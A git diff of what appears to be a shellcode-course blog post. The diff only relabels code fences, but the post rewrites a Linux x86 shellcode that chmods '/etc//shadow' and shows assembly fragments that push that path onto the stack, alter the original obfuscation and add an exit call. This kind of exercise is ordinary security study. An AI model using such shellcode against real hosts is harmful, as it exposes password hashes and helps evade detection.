@@ -11,7 +11,7 @@ Here, I chose this shellcode from [http://shell-storm.org/shellcode/files/shellc
 
 Here is the disassembly commented with my quick notes. I see they are obfuscating the string "adow" and using techniques such as `mov ebx, eax; xor eax, ebx` to perhaps obfuscate an `xor eax, eax`.
 
-```x86asm
+```assembly
 section .text
 global _start
 
@@ -48,7 +48,7 @@ Shellcode (length: 51 bytes)
 
 I start the modifications by just xor'ing and removing the previous mov instruction to set eax to 0x0.
 
-```x86asm
+```assembly
 ; mov ebx, eax
 ; xor eax, ebx            ; = xor eax, eax
 xor eax, eax
@@ -56,7 +56,7 @@ xor eax, eax
 
 Next I remove the deobfuscated string, and change the mov instructions to push instructions in order to get the string "/etc//shadow" onto the stack.
 
-```x86asm
+```assembly
 ; ; push obfuscated "adow" string
 ; mov esi, 0x563a1f3e
 ; add esi, 0x21354523
@@ -71,14 +71,14 @@ push 0x6374652f         ; "cte/"
 
 The rest of the instructions are the same, however, I also added a call to exit() so the shellcode exits gracefully. Since we can assume the chmod returns the value of 0, I will increment it's value to reference the exit syscall.
 
-```x86asm
+```assembly
 inc eax
 int 0x80
 ```
 
 # New Disassembly + Shellcode
 
-```x86asm
+```assembly
 section .text
 global _start
 
